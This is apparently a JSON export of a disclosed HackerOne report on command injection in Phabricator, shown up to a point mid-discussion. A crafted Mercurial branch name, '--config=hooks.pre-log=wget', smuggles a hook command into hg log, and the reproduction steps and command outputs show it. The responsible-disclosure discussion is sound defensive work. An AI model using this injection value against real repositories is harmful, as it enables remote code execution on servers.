{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-11-11T00:42:43.979Z", 
    "voters": [
        "michiel", 
        "bl4de", 
        "secator", 
        "jr0ch17", 
        "spam404", 
        "europa", 
        "hunter", 
        "003random", 
        "mik317", 
        "flashdisk", 
        "and 24 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 288704, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-11-10T16:49:58.513Z", 
    "vulnerability_information": "Hi phabricator,\n\nI found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.\n\nHere is the reproduction steps:\n1. Monitor a remote mercurial repo with phabricator;\n2. Create a branch and called \"--config=hooks.pre-log=wget\" on the remote;\n3. After phabricator update the remote repo,visit the history page of that crafted branch;\n```\nhttp://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/\n```\n4. It will raise an error like below and the wget command will be executed;\n5. I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).\n\n```\nCommand failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-\nconnect' log --debug --template '{node};{parents}\\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev \n'reverse(ancestors('\\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\\''))' STDOUT running hook pre-log: \nwget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file \n/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... \n[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1\n```\nThe root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.\nThanks!", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "low", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "changed", 
            "integrity": "high", 
            "availability": "high"
        }, 
        "rating": "critical", 
        "score": 9.9, 
        "author_type": "User"
    }, 
    "title": "Command injection on Phabricator instance with an evil hg branch name", 
    "is_member_of_team?": null, 
    "vote_count": 34, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-12-10T16:49:58.678Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "attachments": [
        {
            "file_name": "evil_hg_branch_name_command_injection.png", 
            "type": "image/png", 
            "id": 237921, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/237/921/7ec657be3a8e22865edac940b577af482656abf8/evil_hg_branch_name_command_injection.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222947Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a063f5b78493a3db9dac8c386e99e2e363653f1784f14544c191ff8d28db3829"
        }, 
        {
            "file_name": "evil_hg_branch_name_command_injection_cloud.png", 
            "type": "image/png", 
            "id": 237923, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/237/923/09a969f6698aefcd9d99271d0600471b28e4c279/evil_hg_branch_name_command_injection_cloud.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222947Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c82a7bbfc2572cf2c6fc0d1427030654edb9cee663586da12faf11f1658256ed"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-11-09T13:35:03.903Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T13:35:03.903Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I can reproduce the important part of this locally with Mercurial `4.4.1`.\n\nHave you reported this to Mercurial, or do you believe Mercurial is already aware of it? I'd like to coordinate with the Mercurial upstream around this because they've previously considered similar issues to be security concerns (CVE-2017-9462, CVE-2017-1000116) and I think this is ultimately a Mercurial issue, not a Phabricator issue, although it's severe and we'll need to mitigate it.\n\nIf you haven't reported this to Mercurial yet I can report it on your behalf, but if you've already reported it, plan to report it, or believe someone else has already reported it it would be helpful to know about that.\n\n(I'm going to get in touch with them regardless, because any fix will make will reveal the vulnerability.)", 
            "markdown_message": "<p>I can reproduce the important part of this locally with Mercurial <code>4.4.1</code>.</p>\n\n<p>Have you reported this to Mercurial, or do you believe Mercurial is already aware of it? I&#39;d like to coordinate with the Mercurial upstream around this because they&#39;ve previously considered similar issues to be security concerns (CVE-2017-9462, CVE-2017-1000116) and I think this is ultimately a Mercurial issue, not a Phabricator issue, although it&#39;s severe and we&#39;ll need to mitigate it.</p>\n\n<p>If you haven&#39;t reported this to Mercurial yet I can report it on your behalf, but if you&#39;ve already reported it, plan to report it, or believe someone else has already reported it it would be helpful to know about that.</p>\n\n<p>(I&#39;m going to get in touch with them regardless, because any fix will make will reveal the vulnerability.)</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146046, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T13:51:34.317Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T13:51:34.317Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I think the hook usage in this place is a normal use for mercurial rather than a vulnerability.Application use hg command need to place any user applied input after \"--\" or use the sha value instead the string value.\nI haven't reported this to them yet,cause i don't think this is on their side.The hook pre-log is designed to be executed before hg log command.", 
            "markdown_message": "<p>I think the hook usage in this place is a normal use for mercurial rather than a vulnerability.Application use hg command need to place any user applied input after &quot;--&quot; or use the sha value instead the string value.<br>\nI haven&#39;t reported this to them yet,cause i don&#39;t think this is on their side.The hook pre-log is designed to be executed before hg log command.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146072, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T13:54:58.982Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T13:54:58.982Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "You can place the option --config=hooks.pre-[log|pull|update|cat|...etc] to the certain and it's a normal usage not like the one you point out in the comment.", 
            "markdown_message": "<p>You can place the option --config=hooks.pre-[log|pull|update|cat|...etc] to the certain and it&#39;s a normal usage not like the one you point out in the comment.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146077, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T13:57:57.708Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T13:57:57.708Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Just like the git rebase command,if a filename called --exec=id and some application use this directly and inject to the git rebase command that will lead to command injection and this is totaly not the git's fault.", 
            "markdown_message": "<p>Just like the git rebase command,if a filename called --exec=id and some application use this directly and inject to the git rebase command that will lead to command injection and this is totaly not the git&#39;s fault.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146083, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:02:03.957Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:02:03.957Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I already did some testing on phabricator and the filename always have a prefix \"./\" when executing command and the branch name in other place will force to convert to it's SHA value and your guys just missed this hg log scenario.", 
            "markdown_message": "<p>I already did some testing on phabricator and the filename always have a prefix &quot;./&quot; when executing command and the branch name in other place will force to convert to it&#39;s SHA value and your guys just missed this hg log scenario.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146098, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:05:05.053Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:05:05.053Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I think Mercurial is in the wrong here, for two reasons.\n\nFirst, its behavior is inconsistent with other software. Consider:\n\n```\n$ git rebase --onto '--exec=wget' master\nfatal: Needed a single revision\nDoes not point to a valid commit: --exec=wget\n```\n\nGit interprets `--exec=wget` as the target for `--onto` because it immediately follows the `--onto` flag.\n\n```\n$ python -c -d 'print 1'\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\nNameError: name 'd' is not defined\n```\n\nPython interprets `-d` as the command to execute with `-c`, not a flag, because it immediately follows the `-c` flag.\n\nAll software I'm familiar with works like this: if an `--argument` takes a parameter, that parameter is _always_ interpreted as the value for the argument, not a flag.\n\nSecond, it's impossible to escape this command safely. We can't add `--`:\n\n```\n$ hg log --b -- '--config=hooks.pre-log=wget' --rev x\nhg log: option --branch requires argument\n```\n\n...and I believe it's unreasonable for Mercurial to take the position that callers must test and reject \"unsafe\" branch names before invoking commands.\n\nThat said, it's possible that Mercurial will not consider this to be a vulnerability.", 
            "markdown_message": "<p>I think Mercurial is in the wrong here, for two reasons.</p>\n\n<p>First, its behavior is inconsistent with other software. Consider:</p>\n<pre class=\"highlight plaintext\"><code>$ git rebase --onto &#39;--exec=wget&#39; master\nfatal: Needed a single revision\nDoes not point to a valid commit: --exec=wget\n</code></pre>\n<p>Git interprets <code>--exec=wget</code> as the target for <code>--onto</code> because it immediately follows the <code>--onto</code> flag.</p>\n<pre class=\"highlight plaintext\"><code>$ python -c -d &#39;print 1&#39;\nTraceback (most recent call last):\n  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;\nNameError: name &#39;d&#39; is not defined\n</code></pre>\n<p>Python interprets <code>-d</code> as the command to execute with <code>-c</code>, not a flag, because it immediately follows the <code>-c</code> flag.</p>\n\n<p>All software I&#39;m familiar with works like this: if an <code>--argument</code> takes a parameter, that parameter is <u>always</u> interpreted as the value for the argument, not a flag.</p>\n\n<p>Second, it&#39;s impossible to escape this command safely. We can&#39;t add <code>--</code>:</p>\n<pre class=\"highlight plaintext\"><code>$ hg log --b -- &#39;--config=hooks.pre-log=wget&#39; --rev x\nhg log: option --branch requires argument\n</code></pre>\n<p>...and I believe it&#39;s unreasonable for Mercurial to take the position that callers must test and reject &quot;unsafe&quot; branch names before invoking commands.</p>\n\n<p>That said, it&#39;s possible that Mercurial will not consider this to be a vulnerability.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146105, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:06:41.626Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:06:41.626Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Here's the mail I sent Mercurial's security list:\n\n---\nTo: security@mercurial-scm.org\nSubject: Command Injection: hg log -b '--config=...' --rev x\n\nMercurial interprets the branch name \"--config=...\" as a \"--config\" flag in this command:\n\n\t$ hg log -b '--config=hooks.pre-log=wget' --rev x\n\twget: missing URL\n\tUsage: wget [OPTION]... [URL]...\n\n\tTry `wget --help' for more options.\n\tabort: pre-log hook exited with status 1\n\nThis reproduces for me in Mercurial 4.4.1, and appears to impact some larger number of flags (perhaps all flags which take arguments?) provided that the flag is not the last argument in the command. For example, I can `hg log --rev '--config=...' -b x` instead.\n\nThis may represent a security vulnerability if software invokes this command or other similar commands with user input, even when that input is properly escaped (above, the \"--config\" flag has been properly escaped for the shell).\n\nI learned of this because I received a vulnerability report for some software I help maintain (\"Phabricator\") via HackerOne earlier this morning, so credit tentatively goes to Tianqi Zhang (pnig0s) on that platform. (I've asked him for more information about how he discovered this, since I'm not sure if he's the original researcher or not.)\n\nThe impact on Phabricator is critical (remote code execution) so we need to respond to this regardless of what Mercurial does with it. This issue may already be known, but our fix will disclose the nature of the issue so I wanted to coordinate with the Mercurial upstream in case this is something you also consider significant.\n\nIn my assessment, this is generally similar in nature to CVE-2017-9462 and CVE-2017-1000116.\n\nIf Mercurial does not consider this to be a security issue, we'll fix this and disclose it (by nature of the changelog and repository being open source) today, probably via kludgy blacklisting. We're happy to wait if you want to take action here and coordinate releases on a different timeline, though.\n\n(I don't plan to allocate a CVE identifier since this isn't my discovery and I'm not sure if Mercurial considers it a vulnerability.)\n\nThanks,\nEvan", 
            "markdown_message": "<p>Here&#39;s the mail I sent Mercurial&#39;s security list:</p>\n\n<hr>\n\n<p>To: <a title=\"security@mercurial-scm.org\" href=\"mailto:security@mercurial-scm.org\" rel=\"nofollow noopener noreferrer\">security@mercurial-scm.org</a><br>\nSubject: Command Injection: hg log -b &#39;--config=...&#39; --rev x</p>\n\n<p>Mercurial interprets the branch name &quot;--config=...&quot; as a &quot;--config&quot; flag in this command:</p>\n<pre class=\"highlight plaintext\"><code>$ hg log -b &#39;--config=hooks.pre-log=wget&#39; --rev x\nwget: missing URL\nUsage: wget [OPTION]... [URL]...\n\nTry `wget --help&#39; for more options.\nabort: pre-log hook exited with status 1\n</code></pre>\n<p>This reproduces for me in Mercurial 4.4.1, and appears to impact some larger number of flags (perhaps all flags which take arguments?) provided that the flag is not the last argument in the command. For example, I can <code>hg log --rev &#39;--config=...&#39; -b x</code> instead.</p>\n\n<p>This may represent a security vulnerability if software invokes this command or other similar commands with user input, even when that input is properly escaped (above, the &quot;--config&quot; flag has been properly escaped for the shell).</p>\n\n<p>I learned of this because I received a vulnerability report for some software I help maintain (&quot;Phabricator&quot;) via HackerOne earlier this morning, so credit tentatively goes to Tianqi Zhang (pnig0s) on that platform. (I&#39;ve asked him for more information about how he discovered this, since I&#39;m not sure if he&#39;s the original researcher or not.)</p>\n\n<p>The impact on Phabricator is critical (remote code execution) so we need to respond to this regardless of what Mercurial does with it. This issue may already be known, but our fix will disclose the nature of the issue so I wanted to coordinate with the Mercurial upstream in case this is something you also consider significant.</p>\n\n<p>In my assessment, this is generally similar in nature to CVE-2017-9462 and CVE-2017-1000116.</p>\n\n<p>If Mercurial does not consider this to be a security issue, we&#39;ll fix this and disclose it (by nature of the changelog and repository being open source) today, probably via kludgy blacklisting. We&#39;re happy to wait if you want to take action here and coordinate releases on a different timeline, though.</p>\n\n<p>(I don&#39;t plan to allocate a CVE identifier since this isn&#39;t my discovery and I&#39;m not sure if Mercurial considers it a vulnerability.)</p>\n\n<p>Thanks,<br>\nEvan</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146111, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:18:07.964Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:18:07.964Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Alright i'll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.", 
            "markdown_message": "<p>Alright i&#39;ll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146136, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:18:47.847Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:18:47.847Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I'm going to wait for a response from the Mercurial upstream.\n\nIf they don't consider this to be a vulnerability in Mercurial, we'll patch, release, and disclose it ASAP (probably today if they get back to us in the next few hours), since this has a major security impact on Phabricator.\n\nIf they do consider it to be a vulnerability, we'll work with them to figure out a release/disclosure timeline, since our fix will necessarily reveal the nature of the vulnerability.\n\nIf I don't hear back from them in ~36 hours we'll probably move forward with this without their involvement, but we'll see.", 
            "markdown_message": "<p>I&#39;m going to wait for a response from the Mercurial upstream.</p>\n\n<p>If they don&#39;t consider this to be a vulnerability in Mercurial, we&#39;ll patch, release, and disclose it ASAP (probably today if they get back to us in the next few hours), since this has a major security impact on Phabricator.</p>\n\n<p>If they do consider it to be a vulnerability, we&#39;ll work with them to figure out a release/disclosure timeline, since our fix will necessarily reveal the nature of the vulnerability.</p>\n\n<p>If I don&#39;t hear back from them in ~36 hours we&#39;ll probably move forward with this without their involvement, but we&#39;ll see.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146139, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:22:24.001Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:22:24.001Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "> Alright i'll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.\n\nIn the general case, this isn't possible. Not all parameters have SHA equivalents, and I think `hg log -b default` can not be equivalent to `hg log -b <any hash>` because `default` may have multiple open branch heads which are not mutual ancestors.", 
            "markdown_message": "<blockquote>\n<p>Alright i&#39;ll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.</p>\n</blockquote>\n\n<p>In the general case, this isn&#39;t possible. Not all parameters have SHA equivalents, and I think <code>hg log -b default</code> can not be equivalent to <code>hg log -b &lt;any hash&gt;</code> because <code>default</code> may have multiple open branch heads which are not mutual ancestors.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146147, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:29:39.146Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:29:39.146Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Well i think you can just make the \"default\" a fix string in the hg command when it need to be used rather than use this from user supplied like other customed branches.I also tested similar issue on other applications that support mercurial and most of them force using SHA value,fix the \"default\" branch name or put \"--\" before user applied value.I think combine above three methods can fix these kind of issue.", 
            "markdown_message": "<p>Well i think you can just make the &quot;default&quot; a fix string in the hg command when it need to be used rather than use this from user supplied like other customed branches.I also tested similar issue on other applications that support mercurial and most of them force using SHA value,fix the &quot;default&quot; branch name or put &quot;--&quot; before user applied value.I think combine above three methods can fix these kind of issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146175, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:41:49.734Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:41:49.734Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "This definitely can not be fixed by making \"default\" a hard-coded string, using \"--\", or converting branch names into SHA values. Those workarounds either do not work or change the meaning of the command. \n\nAlso note that `--config=hooks.pre-log=wget` is a perfectly valid Mercurial branch name:\n\n```\n$ hg branch -- '--config=hooks.pre-log=wget'\nmarked working directory as branch --config=hooks.pre-log=wget\n```\n\n```\n$ hg heads\nchangeset:   21:60e36457f9cd\nbranch:      --config=hooks.pre-log=wget\ntag:         tip\nuser:        Evan Priestley <hg@yghe.net>\ndate:        Thu Nov 09 06:34:45 2017 -0800\n```\n\nIt can be *worked around* by using revset syntax so that we don't specify any additional parameters, but this is not robust or general.\n\nI'm also not convinced that this is the only vulnerable command. Even if it is, we need to put a fix in place not only for existing commands, but also for possible future commands, so we don't turn around and introduce another vulnerable command in the future.", 
            "markdown_message": "<p>This definitely can not be fixed by making &quot;default&quot; a hard-coded string, using &quot;--&quot;, or converting branch names into SHA values. Those workarounds either do not work or change the meaning of the command. </p>\n\n<p>Also note that <code>--config=hooks.pre-log=wget</code> is a perfectly valid Mercurial branch name:</p>\n<pre class=\"highlight plaintext\"><code>$ hg branch -- &#39;--config=hooks.pre-log=wget&#39;\nmarked working directory as branch --config=hooks.pre-log=wget\n</code></pre><pre class=\"highlight plaintext\"><code>$ hg heads\nchangeset:   21:60e36457f9cd\nbranch:      --config=hooks.pre-log=wget\ntag:         tip\nuser:        Evan Priestley &lt;hg@yghe.net&gt;\ndate:        Thu Nov 09 06:34:45 2017 -0800\n</code></pre>\n<p>It can be <em>worked around</em> by using revset syntax so that we don&#39;t specify any additional parameters, but this is not robust or general.</p>\n\n<p>I&#39;m also not convinced that this is the only vulnerable command. Even if it is, we need to put a fix in place not only for existing commands, but also for possible future commands, so we don&#39;t turn around and introduce another vulnerable command in the future.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146209, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T14:57:35.553Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T14:57:35.553Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "How about using \"hg log --branch=--config=hooks.pre-log=wget\" as long as the beginning of the value is not \"-\" or \"--\" the option won't work any more.\n\n```\n# hg log --branch=--config=hooks.pre-log=wget\nchangeset:   71:84e8c5feb4fa\nbranch:      --config=hooks.pre-log=wget\nparent:      68:90b627c305ef\nuser:        pwn2own <pnigos@live.com>\ndate:        Thu Nov 09 07:45:15 2017 +0000\nsummary:     Created new branch --config=hooks.pre-log=wget\n```", 
            "markdown_message": "<p>How about using &quot;hg log --branch=--config=hooks.pre-log=wget&quot; as long as the beginning of the value is not &quot;-&quot; or &quot;--&quot; the option won&#39;t work any more.</p>\n<pre class=\"highlight plaintext\"><code># hg log --branch=--config=hooks.pre-log=wget\nchangeset:   71:84e8c5feb4fa\nbranch:      --config=hooks.pre-log=wget\nparent:      68:90b627c305ef\nuser:        pwn2own &lt;pnigos@live.com&gt;\ndate:        Thu Nov 09 07:45:15 2017 +0000\nsummary:     Created new branch --config=hooks.pre-log=wget\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2146267, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T15:02:44.033Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T15:02:44.033Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I think the goal of the hook feature is designed to be executed as a high priority than other command options so that there're pre-command,post-command and fail-command kind of hooks here.Also the --config is a global hg option and not for some certain sub-command.", 
